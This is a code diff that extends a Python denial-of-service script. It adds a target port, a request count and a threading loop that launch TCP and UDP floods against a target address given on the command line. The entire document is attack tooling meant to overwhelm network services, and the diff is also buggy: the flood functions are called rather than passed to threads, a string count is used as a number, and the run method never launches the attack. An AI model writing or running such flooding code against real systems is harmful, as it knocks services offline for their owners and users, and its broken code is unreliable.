@@ -3,19 +3,20 @@
 #
 import os, sys, time, subprocess
 import socket
+from threading import Thread
 from colorama import Fore, Style
 from argparse import ArgumentParser
 
 class Dos():
 
-    def tcp_flood(self, ip):
+    def tcp_flood(self, data, ip, port):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-            sock.connect((ip, 80))
-            pass
+            sock.connect((ip, port))
+            sock.send(data)
 
-    def udp_flood(self, ip):
+    def udp_flood(self, data, ip, port):
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-            sock.sendto(data, (ip, 80))
+            sock.sendto(data, (ip, port))
 
 class Controller(Dos):
 
@@ -50,20 +51,15 @@ class Controller(Dos):
         parser = ArgumentParser(description=self.banner_txt)
         parser.add_argument("-t", "--target", dest="target_addr")
         parser.add_argument("-m", "--mode", dest="dos_mode")
+        parser.add_argument("-a", "--amount", dest="amount")
         args = parser.parse_args()
         _true = self.check_args(args)
         if _true:
-            return args.target_addr, args.dos_mode
+            return args.target_addr, args.dos_mode, args.amount
 
     def check_args(self, args):
-        if args.target_addr and args.dos_mode:
+        if args.target_addr and args.dos_mode and args.amount:
             return True
-        elif args.target_addr:
-            print("Please define dos mode [tcp/udp]")
-            sys.exit(0)
-        elif arg.dos_mode:
-            print("Please define target adress")
-            sys.exit(0)
         else:
             print("Use -h or --help for futher information")
             sys.exit(0)
@@ -76,11 +72,22 @@ class Controller(Dos):
         print(Fore.CYAN + self.banner_txt)
         print(Style.RESET_ALL)
 
-    def threads(self):
-        pass
+    def threads(self, amount, dos_mode, data, target_ip, port):
+        if dos_mode == 'tcp':
+            self.dos = self.tcp_flood(data, target_ip, port)
+        elif dos_mode == 'udp':
+            self.dos = self.udp_flood(data, target_ip, port)
+        for thread in range(amount+1):
+            thread = Thread(self.dos)
+            print("Starting Thread [{}]".format(thread))
+            try:
+                if thread.start():
+                    print("Sucessfully started [{}]".format(thread))
+            except Exception:
+                continue
 
     def run(self):
-        target_addr, dos_mode = self.arguments()
+        target_addr, dos_mode, amount = self.arguments()
         target_ip = self.get_fqdm(target_addr)
 
 if __name__ == "__main__":
